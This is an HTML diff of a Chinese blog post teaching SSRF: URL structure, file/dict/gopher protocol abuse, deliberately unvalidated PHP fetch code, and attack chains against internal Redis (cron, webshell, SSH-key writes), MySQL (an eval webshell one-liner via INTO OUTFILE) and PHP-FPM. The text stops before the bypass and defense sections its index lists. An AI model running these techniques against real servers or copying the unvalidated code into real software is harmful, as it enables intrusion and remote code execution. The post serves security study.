@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SSRF从0到1 · Maple/G7</title>
+<meta name="description" content="SSRF 从 0 到 1 —— URL 结构与协议利用、Gopher 打 Redis / MySQL / PHP-FPM 与内网 Web 的完整链路、IP 与解析差异绕过、DNS 重绑定、NAT 环回，以及防御手法">
+<script>document.documentElement.classList.add('js');</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;500&family=Noto+Serif+SC:wght@400;600;900&family=Noto+Sans+SC:wght@300;400;500&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css?v=v14">
+</head>
+<body class="page-post">
+
+<div class="grain" aria-hidden="true"></div>
+<div class="rule-rail" aria-hidden="true"></div>
+<div class="progress" id="progress" aria-hidden="true"></div>
+<div class="cursor" id="cursor" aria-hidden="true"><span class="cursor-ring"></span><span class="cursor-dot"></span></div>
+
+<header class="topbar">
+  <a class="brand" href="index.html">
+    <span class="brand-mark">Maple<span class="t-slash">/</span>G7</span>
+  </a>
+  <nav class="nav">
+    <a href="index.html">首页</a>
+    <a href="notes.html" class="is-on">文章</a>
+    <a href="projects.html">项目</a>
+    <a href="links.html">友链</a>
+    <a href="about.html">关于</a>
+  </nav>
+  <p class="topbar-meta mono">VOL.01 / 2026</p>
+</header>
+
+<article class="post">
+
+  <header class="cover">
+    <div class="cover-art" aria-hidden="true">
+      <img src="img/art-horse.webp" alt="" style="object-position: 50% 30%" fetchpriority="high" decoding="async">
+    </div>
+    <div class="cover-ticks" aria-hidden="true"><i></i><i></i><i></i><i></i></div>
+
+    <div class="cover-inner">
+      <p class="kicker mono"><span class="k-no">01</span>NOTES <em>·</em> 学习日志 <em>·</em> 2026.11.03</p>
+      <h1 class="post-title">SSRF从0到1</h1>
+      <p class="post-desc">SSRF 从 0 到 1 —— URL 结构与协议利用、Gopher 打 Redis / MySQL / PHP-FPM 与内网 Web 的完整链路、IP 与解析差异绕过、DNS 重绑定、NAT 环回，以及防御手法</p>
+
+      <ul class="post-meta mono">
+        <li><b>7,345</b>字</li>
+        <li class="meta-tags"><b>TAGS</b><ul class="tag-list"><li>SSRF</li><li>Web安全</li><li>内网渗透</li><li>协议利用</li></ul></li>
+      </ul>
+
+      <div class="cover-seal" aria-hidden="true"><span>墨</span></div>
+    </div>
+  </header>
+
+  <nav class="post-bar">
+    <a class="post-back" href="notes.html" data-hover><span>←</span>全部文章</a>
+    <span class="post-bar-mid mono">学习日志 · 7,345 字</span>
+  </nav>
+
+  <div class="layout">
+
+    <aside class="toc">
+      <div class="toc-sticky">
+        <p class="rail-h mono">INDEX</p>
+        <ol class="toc-list"><li class="toc-item toc-l2"><a href="#s1" data-toc="s1"><span class="toc-no">01</span><span class="toc-tx">一、SSRF的利用基础</span></a></li>
+<li class="toc-item toc-l3"><a href="#s2" data-toc="s2"><span class="toc-no"></span><span class="toc-tx">URL结构解析</span></a></li>
+<li class="toc-item toc-l2"><a href="#s4" data-toc="s4"><span class="toc-no">02</span><span class="toc-tx">二、SSRF常见的漏洞场景</span></a></li>
+<li class="toc-item toc-l2"><a href="#s5" data-toc="s5"><span class="toc-no">03</span><span class="toc-tx">三、SSRF漏洞攻击方式</span></a></li>
+<li class="toc-item toc-l3"><a href="#s6" data-toc="s6"><span class="toc-no"></span><span class="toc-tx">1. 内部服务资产探测</span></a></li>
+<li class="toc-item toc-l3"><a href="#s7" data-toc="s7"><span class="toc-no"></span><span class="toc-tx">2. 使用Gopher协议扩展攻击面</span></a></li>
+<li class="toc-item toc-l2"><a href="#s13" data-toc="s13"><span class="toc-no">04</span><span class="toc-tx">四、SSRF的绕过</span></a></li>
+<li class="toc-item toc-l3"><a href="#s14" data-toc="s14"><span class="toc-no"></span><span class="toc-tx">1. 针对 IP 格式拦截的绕过（字符串层）</span></a></li>
+<li class="toc-item toc-l3"><a href="#s18" data-toc="s18"><span class="toc-no"></span><span class="toc-tx">2. 针对敏感目标拦截的绕过（域名/链路层）</span></a></li>
+<li class="toc-item toc-l3"><a href="#s23" data-toc="s23"><span class="toc-no"></span><span class="toc-tx">3. 针对组件解析差异的绕过（代码逻辑层）</span></a></li>
+<li class="toc-item toc-l3"><a href="#s24" data-toc="s24"><span class="toc-no"></span><span class="toc-tx">4. 针对“先解析后请求”逻辑的绕过（DNS 重绑定）</span></a></li>
+<li class="toc-item toc-l3"><a href="#s25" data-toc="s25"><span class="toc-no"></span><span class="toc-tx">5. 针对网络架构的绕过（外网访问绕过）</span></a></li>
+<li class="toc-item toc-l2"><a href="#s26" data-toc="s26"><span class="toc-no">05</span><span class="toc-tx">五、SSRF的防御手法</span></a></li></ol>
+        <img class="toc-mo" src="img/mo-01.webp" alt="" aria-hidden="true">
+      </div>
+    </aside>
+
+    <div class="prose"><p><strong>SSRF（Server Side Request Forgery，服务端请求伪造）是一种攻击者通过构造数据进而伪造服务器端发起请求的漏洞。</strong> 因为请求是由内部发起的，所以一般情况下，SSRF漏洞攻击的目标往往是从外网无法访问的内部系统。</p>
+<p>SSRF的核心就是让服务器去请求一个用户可控的URL，攻击者往往会利用URL结构的各个部分（尤其是scheme、userinfo和host）来绕过WAF拦截或绕过代码层的内网限制。</p>
+<p><strong>SSRF产生原因</strong>：</p>
+<ul>
+<li><p><strong>业务需求</strong>：服务器为了抓取图片、解析RSS、预览文档，必须提供从外部服务获取数据的功能。</p>
+</li>
+<li><p><strong>存在漏洞的服务器</strong>：后端代码对用户输入的URL<strong>零校验</strong>。用户传 <code>http://127.0.0.1:6379</code>，它就去请求内网Redis；传 <code>file:///etc/passwd</code>，它就读取本地文件。</p>
+</li>
+<li><p><strong>安全的服务器</strong>：做了严格的校验。比如<strong>白名单限制</strong>（只能访问 <code>*.baidu.com</code>）、<strong>内网IP拦截</strong>（解析IP发现是 <code>192.168.x.x</code> 就拒绝）、<strong>禁用危险协议</strong>（只允许http/https，禁用file/gopher）。</p>
+</li>
+</ul>
+<p><strong>SSRF的核心危害</strong>：突破边界，探测内网，攻击内网未授权服务。</p>
+<hr>
+<h2 id="s1">一、SSRF的利用基础<a class="h-link" href="#s1" aria-hidden="true">§</a></h2>
+<h3 id="s2">URL结构解析<a class="h-link" href="#s2" aria-hidden="true">§</a></h3>
+<p><figure class="fig"><img src="img/ssrf-url-structure.webp" alt="URL 结构：scheme://authority/path?query#fragment" loading="lazy" decoding="async"></figure>
+</p>
+<ul>
+<li><p><strong>scheme</strong>：表示获取资源所需要的协议，如 http, https, file, gopher, dict 等。
+   SSRF利用点：</p>
+<ul>
+<li><p>利用 file:// 读取本地文件</p>
+</li>
+<li><p>利用 gopher:// 或 dict:// 向内网服务发送恶意数据包（如攻击Redis、MySQL）。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>authority</strong>：由userinfo,host,port三部分组成。</p>
+<ul>
+<li><p>userinfo@（用户信息）：即 用户名:密码@。这是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要进行身份验证</p>
+<ul>
+<li>SSRF绕过经典手法：见之后的URL解析差异部分</li>
+</ul>
+</li>
+<li><p>host：表示在哪个服务器上获取资源</p>
+<ul>
+<li>SSRF利用点：这里填内网IP（如 192.168.x.x）或云服务器元数据IP（如 169.254.169.254）。</li>
+</ul>
+</li>
+<li><p>port：服务器端口。</p>
+<ul>
+<li>SSRF利用点：用于内网端口探测，判断内网存在哪些服务（如 <a href="http://127.0.0.1:6379">http://127.0.0.1:6379</a> 探测Redis）。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>path</strong>：指向资源的路径，一般使用“/”进行分层。</p>
+</li>
+<li><p><strong>query</strong>：查询字符串，用户将用户输入数据传递给服务端</p>
+</li>
+<li><p><strong>fragment</strong>：片段ID，与query不同的是，其内容不会被传递到服务端，一般用于表示页面的锚点。如 #top。通常只在浏览器端生效，不会发送给服务器，但在某些解析差异下可能用于绕过。</p>
+</li>
+</ul>
+<hr>
+<h4 id="s3">协议利用<a class="h-link" href="#s3" aria-hidden="true">§</a></h4>
+<p>在对存在SSRF漏洞的应用进行测试的时候，可以尝试是否能控制、支持常见的协议，包括但不限于以下协议。</p>
+<ul>
+<li><p><code>file://</code>：从文件系统中获取文件内容，如<code>file:///etc/passwd</code>。</p>
+</li>
+<li><p><code>dict://</code>：字典服务器协议，原本是用来提供在线字典查询的，默认端口是 2628。dict:// 协议允许客户端发送简单的文本命令。很多语言（如 PHP 的 curl、Python 的 urllib）默认支持该协议。SSRF核心利用手法：</p>
+<ol>
+<li><strong>探测内网端口是否开放</strong>：如果目标服务器内网有一台机器 <code>192.168.1.100</code>，想知道它开放了哪些端口。可以发请求：<code>?url=dict://192.168.1.100:6379</code>，如果端口没开，会报错（如 Connection refused）；如果开了，会有回显。</li>
+<li><strong>获取服务版本（Banner 抓取）</strong>：<code>dict://</code> 最大的优势是，当你向目标发送不符合其协议规则的字符串时，目标往往会报错，而报错信息里经常包含服务的版本号。比如探测 Redis：<code>?url=dict://127.0.0.1:6379/info</code>。Redis 不认识 dict 协议，会返回一个错误提示，通常会带出 Redis 的版本。</li>
+</ol>
+</li>
+<li><p><code>gopher://</code>：分布式的文档传递服务，<strong>在SSRF漏洞攻击中发挥的作用非常大</strong>。使用Gopher协议时，通过控制访问的URL可实现向指定的服务器发送任意内容，如HTTP请求、MySQL请求等。</p>
+</li>
+</ul>
+<blockquote>
+<p>gopher 是<strong>比 HTTP 还要古老</strong>的一种网络协议（1991年诞生，后来被 HTTP 淘汰了）。它的本来目的是用来在互联网上浏览网页的。</p>
+<p>它的请求格式非常简单：<code>gopher://主机IP:端口/请求内容</code>。</p>
+<p>之所以被称为“<strong>SSRF 神级协议</strong>”，是因为它有一个极其强大的特性：<strong>支持发送任意 TCP 字节流，且不限制协议</strong>。</p>
+</blockquote>
+<hr>
+<h2 id="s4">二、SSRF常见的漏洞场景<a class="h-link" href="#s4" aria-hidden="true">§</a></h2>
+<ul>
+<li><p>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</p>
+</li>
+<li><p>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</p>
+</li>
+<li><p>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</p>
+</li>
+<li><p>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</p>
+</li>
+<li><p>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</p>
+</li>
+</ul>
+<p><strong>一些常见后端代码</strong>：</p>
+<ul>
+<li><p><code>file_get_contents</code>：可以控制 url 的话就能通过 http 伪协议进行渗透。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"> <span class="hljs-meta">&lt;?php</span>
+
+ <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) {
+   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);
+   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;
+ }
+ <span class="hljs-meta">?&gt;</span></code></pre></div>
+</li>
+<li><p><code>fsockopen()</code>：这个函数允许我们对其本地的某个 socket 进行一个 TCP 链接，然后直接返回 HTTP 响应的文本。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>{ 
+     <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);
+     <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) { 
+         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; 
+     } <span class="hljs-keyword">else</span> { 
+         <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; 
+         <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; 
+         <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;
+         <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; 
+         <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); 
+         <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>;
+         <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) { 
+             <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); 
+         } 
+         <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);
+         <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;
+     }
+ }</code></pre></div>
+</li>
+<li><p><code>curl_exec()</code>：与 file_get_content 十分相似。</p>
+<div class="code" data-lang="php"><div class="code-head"><span class="code-lang">php</span><button class="code-copy" type="button" aria-label="复制代码">COPY</button></div><pre><code class="hljs"> <span class="hljs-meta">&lt;?php</span>
+ <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) {
+     <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];
+     <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();
+     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);
+     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);
+     <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
+     <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);
+     <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);
+
+     <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;
+ }
+ <span class="hljs-meta">?&gt;</span></code></pre></div>
+</li>
+</ul>
+<hr>
+<h2 id="s5">三、SSRF漏洞攻击方式<a class="h-link" href="#s5" aria-hidden="true">§</a></h2>
+<h3 id="s6">1. 内部服务资产探测<a class="h-link" href="#s6" aria-hidden="true">§</a></h3>
+<p>SSRF漏洞可以直接探测网站所在服务器端口（6379 Redis、3306 MySQL、80 Web）的开放情况甚至内网资产情况，如确定该处存在SSRF漏洞，则可以通过确定请求成功与失败的返回信息进行判断服务开放情况。</p>
+<hr>
+<h3 id="s7">2. 使用Gopher协议扩展攻击面<a class="h-link" href="#s7" aria-hidden="true">§</a></h3>
+<h4 id="s8">攻击Redis<a class="h-link" href="#s8" aria-hidden="true">§</a></h4>
+<p><strong>攻击本质与核心链路</strong></p>
+<p>利用存在 SSRF 漏洞的目标服务器作为<strong>网络跳板</strong>，通过 <code>Gopher</code> 协议向其内网的 Redis 发送精心伪造的 TCP 原始报文。利用 Redis 的<strong>未授权访问</strong>及<strong>动态配置修改</strong>功能，实现<strong>任意文件写入</strong>，最终将 SSRF 升级为系统级 RCE（远程命令执行）。</p>
+<p><strong>原理（为什么 Redis 会被滥用）</strong>：</p>
+<ol>
+<li><p><strong>跨协议通信机制</strong>：攻击者处于外网，受限于防火墙无法直接访问内网 Redis（仅支持 Redis 协议）。<code>Gopher</code> 协议在此充当了 <strong>“任意 TCP 数据流构造器”</strong>。Web 请求（HTTP）作为载体，将 URL 编码后的原始 Redis 报文传递给跳板机（服务器），跳板机解码后将其还原为合法的 Redis 请求，向内网发起攻击。</p>
+</li>
+<li><p><strong>持久化机制与配置滥用</strong>：Redis 默认无鉴权（空口令）。其数据存储于内存中，当执行 <code>save</code> 命令时触发 RDB 持久化（将内存数据落盘）。由于 Redis 的 <code>config set</code> 允许动态修改 <code>dir</code>（保存路径）和 <code>dbfilename</code>（保存文件名），且落盘时不校验文件后缀。攻击者借此将恶意 Payload（如系统命令、PHP代码）作为 Value 存入内存，随后篡改路径与文件名，执行 <code>save</code> 即可将其写入系统任意敏感目录。</p>
+</li>
+</ol>
+<p><strong>核心利用点（两个参数）</strong>：</p>
+<ul>
+<li><p><code>config set dir /var/spool/cron/</code>（改路径）</p>
+</li>
+<li><p><code>config set dbfilename root</code>（改文件名）</p>
+</li>
+</ul>
+<p><strong>攻击思路</strong>：</p>
+<ol>
+<li><p>资产探测（确认目标存活）：</p>
+<ul>
+<li><p>URL参数可控</p>
+</li>
+<li><p>尝试访问<code>?url=http://127.0.0.1:6379</code>,如果页面秒回 <code>Connection refused</code>，说明没开；如果页面卡住几秒后超时，说明端口可能被防火墙 Drop 了；如果返回了一段奇怪的报错（比如 <code>-ERR wrong number of arguments for &#39;get&#39; command</code>），说明 <strong>Redis 存在</strong>。</p>
+</li>
+</ul>
+</li>
+<li><p>利用条件确认：</p>
+<ul>
+<li><p><strong>协议支持</strong>：确认后端支持 <code>gopher://</code> 协议（如 PHP 环境默认支持）。</p>
+</li>
+<li><p><strong>权限要求</strong>：需确认 Redis 为空口令（未授权访问）。若有强密码，非交互式盲打几乎不可能，需转换攻击目标。</p>
+</li>
+</ul>
+</li>
+<li><p>选择攻击路径：</p>
+<table>
+<thead>
+<tr>
+<th>攻击路径</th>
+<th>核心操作 (<code>config set</code>)</th>
+<th>适用场景与前置条件</th>
+<th>落地效果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>A. 打 Crontab</strong></td>
+<td><code>dir</code> 设为 <code>/var/spool/cron/</code><br><code>dbfilename</code> 设为 <code>root</code></td>
+<td><strong>无需知晓 Web 路径</strong>。<br/>前提：Redis 以高权限（通常是 root）启动。</td>
+<td>写入定时任务，触发<strong>反弹 Shell</strong>。</td>
+</tr>
+<tr>
+<td><strong>B. 写 WebShell</strong></td>
+<td><code>dir</code> 设为 Web 根目录（如 <code>/var/www/html</code>）<br><code>dbfilename</code> 设为 <code>shell.php</code></td>
+<td><strong>需知晓网站绝对路径</strong>。<br/>前提：Redis 启动用户对 Web 目录有写权限。</td>
+<td>生成一句话木马，通过蚁剑等工具连接。</td>
+</tr>
+<tr>
+<td><strong>C. 写 SSH 公钥</strong></td>
+<td><code>dir</code> 设为 <code>/root/.ssh/</code><br><code>dbfilename</code> 设为 <code>authorized_keys</code></td>
+<td><strong>需知晓 SSH 服务状态</strong>。<br/>前提：Redis 有 root 权限且 <code>.ssh</code> 目录存在。</td>
+<td>写入攻击者公钥，实现 SSH 免密登录。</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<p><strong>Payload构造思想</strong>：</p>
+<p>我们要让 Redis 执行一套完整的“攻击连招”，通常包含 5 条命令：</p>
+<ol>
+<li><p><code>flushall</code> （清空干扰数据）</p>
+</li>
+<li><p><code>set 1 &quot;恶意代码&quot;</code> （把木马写进内存）</p>
+</li>
+<li><p><code>config set dir /var/spool/cron/</code> （修改写入路径）</p>
+</li>
+<li><p><code>config set dbfilename root</code> （修改文件名）</p>
+</li>
+<li><p><code>save</code> （落盘）</p>
+</li>
+</ol>
+<p>然后利用Redis的Pipeline特性直接拼接指令形成payload，让Gopher盲发。</p>
+<blockquote>
+<p>可以直接拼接的原因是：Redis 的协议叫 <strong>RESP</strong>（Redis 序列化协议）。它的最大特点是：<strong>基于纯文本、结构极度简单。</strong> 攻击Mysql就不可以。</p>
+</blockquote>
+<hr>
+<h4 id="s9">攻击MySQL<a class="h-link" href="#s9" aria-hidden="true">§</a></h4>
+<p><strong>攻击本质与核心链路</strong></p>
+<p>利用存在 SSRF 漏洞的目标服务器作为网络跳板，通过 <code>Gopher</code> 协议向其内网的 MySQL（3306端口）发送伪造的<strong>二进制客户端通信数据包</strong>。利用 MySQL 的<strong>空口令未授权访问</strong>漏洞，实现<strong>数据窃取</strong>或<strong>任意文件写入</strong>。</p>
+<p><strong>原理</strong>：</p>
+<ol>
+<li><p><strong>通信协议与认证机制</strong>：MySQL 采用二进制协议。MySQL分为客户端和服务端，由客户端连接服务端  有4种方式：UNIX套接字、内存共享、命名管道、TCP/IP套接字。前三种通常只在目标机器本地使 用，我们进行SSRF攻击只能走第4种：<strong>TCP/IP 套接字</strong>（通过网络连 <code>127.0.0.1:3306</code>）。
+<strong>正常的 MySQL 登录</strong>：客户端发请求，MySQL 服务端先扔给你一个随机的字符串（ <code>salt</code>）。客户端必须用这个 <code>salt</code> 加上你的密码，算出一串哈希值发回去。服务端验证通过，才让你进。</p>
+</li>
+<li><p><strong>SSRF 的致命瓶颈</strong>：Gopher 协议是<strong>单向盲发</strong>的。攻击者无法接收目标返回的 <code>salt</code> 去计算哈希。因此，<strong>非交互式盲打下，只能攻击“空口令”（无密码）的 MySQL</strong>。</p>
+</li>
+<li><p><strong>数据包提取难度</strong>：MySQL 不是纯文本协议，手敲或肉眼构造是不可能的，必须借助底层网络抓包工具提取原始字节流。</p>
+</li>
+</ol>
+<p><strong>核心利用点</strong>：</p>
+<ul>
+<li><p><strong>数据窃取</strong>：直接执行 <code>select</code> 语句，读取管理员账号密码等敏感数据。</p>
+</li>
+<li><p><strong>任意文件写入</strong>：在权限配置不当的情况下，执行 <code>select &#39;&lt;?php eval($_POST[1]);?&gt;&#39; into outfile &#39;/var/www/html/shell.php&#39;;</code> 写入 WebShell。</p>
+</li>
+</ul>
+<p><strong>攻击思路</strong>：</p>
+<ul>
+<li><p><strong>探测存活</strong>：SSRF 访问 <code>?url=http://127.0.0.1:3306</code>，通过响应时间和报错（如 <code>Malformed packet</code>）确认端口开放。</p>
+</li>
+<li><p><strong>条件确认</strong>：盲测或通过信息泄露确认目标 MySQL 为空口令。</p>
+</li>
+<li><p><strong>构造数据包</strong>：本地模拟环境抓包 -&gt; 提取 TCP 流 HEX 数据 -&gt; 进行 URL 编码。</p>
+</li>
+</ul>
+<p><strong>手动构造原理（基于 Wireshark 抓包）</strong>：</p>
+<p>由于 MySQL 协议复杂，需在本地“模拟作案”来获取 Payload：</p>
+<ol>
+<li><p><strong>本地抓包</strong>：在本地（或内网测试机）启动 MySQL，使用 <code>tcpdump -i lo port 3306 -w mysql.pcap</code> 监听。</p>
+</li>
+<li><p><strong>模拟操作</strong>：使用客户端执行登录、<code>use</code> 切库、<code>select</code> 查询等需要攻击的指令。</p>
+</li>
+<li><p><strong>提取数据流</strong>：用 Wireshark 打开抓包文件，找到目标请求，追踪 TCP 流</p>
+</li>
+<li><p>按格式构造Payload</p>
+</li>
+<li><p><strong>编码伪装</strong>：将提取出的一长串十六进制字节流进行 URL 编码，拼接进 <code>gopher://</code> 链接。
+(实战中，这串数据包含登录握手和查询指令，通常长达数百字节)</p>
+</li>
+</ol>
+<hr>
+<h4 id="s10">PHP-FPM攻击<a class="h-link" href="#s10" aria-hidden="true">§</a></h4>
+<blockquote>
+<ol>
+<li><p><strong>CGI (Common Gateway Interface，通用网关接口)</strong>：
+Web 服务器（如 Nginx）本身只能处理静态文件（HTML、图片）。当遇到动态请求（如 PHP）时，服务器需要把请求转交给外部的程序去处理。CGI 就是服务器和外部程序之间通信的<strong>最古老的协议标准</strong>。</p>
+</li>
+<li><p><strong>FastCGI</strong>：
+CGI 的升级版。因为 CGI 每次处理请求都要启动新进程，效率极低。FastCGI 是一个<strong>常驻内存的协议</strong>，它通过长连接复用进程，极大地提升了性能。</p>
+</li>
+<li><p><strong>PHP-FPM (PHP FastCGI Process Manager)</strong>：
+PHP 官方提供的 <strong>FastCGI 进程管理器</strong>。它负责监听端口（默认 9000），接收 Web 服务器（Nginx）发来的 FastCGI 数据包，并调度 PHP 进程进行解析。</p>
+</li>
+<li><p><strong><code>php://input</code></strong>：
+PHP 中的一个输入流协议，代表<strong>客户端 HTTP 请求中 POST 的原始数据</strong>（Body 部分）。</p>
+</li>
+<li><p><strong><code>auto_prepend_file</code></strong>：
+<code>php.ini</code> 中的一个配置项。作用是在执行任何 PHP 文件之前，<strong>先自动包含（require）并执行</strong>该配置项指定的文件。</p>
+</li>
+<li><p><strong><code>allow_url_include</code></strong>：
+<code>php.ini</code> 中的配置项。决定是否允许通过 <code>include/require</code> 包含远程文件（包括 <code>php://input</code> 等特殊流）。</p>
+</li>
+</ol>
+</blockquote>
+<p>在现代 Web 架构中，Nginx 作为 Web 服务器，本身无法处理动态代码，必须将请求交由后端的 PHP-FPM 处理。它们之间的通信依赖于 <strong>FastCGI 协议</strong>。</p>
+<ul>
+<li><strong>请求流转</strong>：客户端发起 HTTP 请求 -&gt; Nginx 接收并解析 -&gt; Nginx 将其封装成 <strong>FastCGI 协议报文</strong> -&gt; 发送至 PHP-FPM (默认监听 9000 端口) -&gt; FPM 调度 PHP 进程执行并返回。</li>
+</ul>
+<p><strong>原理</strong>：</p>
+<p>FastCGI 协议的报文结构中，除了包含 HTTP 的标准字段（如 Request_Method、Content-Length），还允许附带一个特殊字段：<strong><code>PHP_VALUE</code></strong>。
+<code>PHP_VALUE</code> 的设计初衷是让 Nginx 能够动态覆盖 <code>php.ini</code> 中的局部配置。然而，这个功能赋予了攻击者篡改 PHP 运行时环境的能力。</p>
+<p><strong>攻击者利用 SSRF 漏洞，伪造 FastCGI 报文，并在报文中指定以下两项配置：</strong></p>
+<ol>
+<li><p><code>PHP_VALUE = auto_prepend_file = php://input</code></p>
+<ul>
+<li><em>强制 PHP-FPM 在执行任何目标脚本前，先加载 <code>php://input</code> 流。</em></li>
+</ul>
+</li>
+<li><p><code>PHP_VALUE = allow_url_include = On</code></p>
+<ul>
+<li>开启允许包含远程/特殊流文件的权限（默认关闭）。</li>
+</ul>
+</li>
+</ol>
+<p><strong>结果</strong>：当 PHP-FPM 收到这个伪造的报文后，它会先读取请求 Body 中的 POST 数据，将其作为 PHP 代码执行，然后再执行目标文件。攻击者只需在 HTTP 请求的 Body 中写入恶意代码，即可完成任意代码执行（RCE）。</p>
+<p><strong>利用条件</strong>：</p>
+<ol>
+<li><p><strong>版本要求</strong>：<code>libcurl &gt; 7.45.0</code>（支持构造任意 Gopher 报文）；<code>PHP-FPM &gt; 5.3.3</code>（支持 <code>PHP_VALUE</code> 动态覆盖）。</p>
+</li>
+<li><p><strong>网络要求</strong>：PHP-FPM 监听的是 TCP 端口（默认 9000），而不是 UNIX Socket（UNIX Socket 无法通过 SSRF 的 TCP 协议打通）。</p>
+</li>
+<li><p><strong>前置信息获取</strong>：<strong>必须知晓服务器上任意一个已存在的 <code>.php</code> 文件的绝对路径。</strong></p>
+<ul>
+<li><p><em>原因</em>：FastCGI 在解析时，会先检查该文件是否存在。若不存在则直接报错，无法触发后续逻辑。</p>
+</li>
+<li><p><em>限制</em>：受 <code>security.limit-extensions</code> 限制，该文件后缀必须是 <code>.php</code>。</p>
+</li>
+<li><p><em>破解思路</em>：利用 <code>file://</code> 协议读取服务器配置、源码，或盲猜默认路径（如 <code>/var/www/html/index.php</code>、<code>/usr/local/lib/php/PEAR.php</code> 等）。</p>
+</li>
+</ul>
+</li>
+</ol>
+<p><strong>Payload构造思路</strong>：</p>
+<p>FastCGI 协议是基于二进制的，包含包头、长度、状态码等极其复杂的结构，<strong>人类无法像手写 Redis 纯文本命令那样直接手敲 Payload</strong>。</p>
+<ol>
+<li><p><strong>生成二进制流</strong>：使用脚本或工具，按照 FastCGI 协议规范，将恶意配置和代码打包成一段二进制数据。</p>
+</li>
+<li><p><strong>借助 Gopher 传输</strong>：由于 SSRF 通常基于 HTTP，无法直接发送二进制。而 Gopher 协议支持传输原始 TCP 字节流（包含任意二进制和特殊字符）。</p>
+</li>
+<li><p><strong>封装 Payload</strong>：将生成的 FastCGI 二进制流进行 URL 编码，拼接在 <code>gopher://127.0.0.1:9000/_</code> 之后，通过 SSRF 漏洞向目标服务器发送。</p>
+</li>
+</ol>
+<hr>
+<h4 id="s11">攻击内网中的脆弱Web应用（伪造 HTTP POST 请求）<a class="h-link" href="#s11" aria-hidden="true">§</a></h4>
+<p>在复杂的内网环境中，大量的内部系统（如 Jenkins、OA、内部 API 管理台）往往存在高危漏洞。但这些漏洞通常<strong>不接受简单的 GET 请求</strong>，而是需要 POST 数据（如命令执行参数、序列化数据），甚至需要特定的 Header（如 Cookie、认证 Token）。</p>
+<p>常规的 SSRF 漏洞只能利用 <code>http://</code> 发起简单的 GET 请求，无法携带 Body 数据，导致无法触发内网 Web 应用的真实漏洞。</p>
+<p>利用 Gopher 协议能够传输原始 TCP 数据流的特性，构造一个完整的 HTTP POST 报文，让存在 SSRF 的服务器将其原封不动地投递给内网目标。</p>
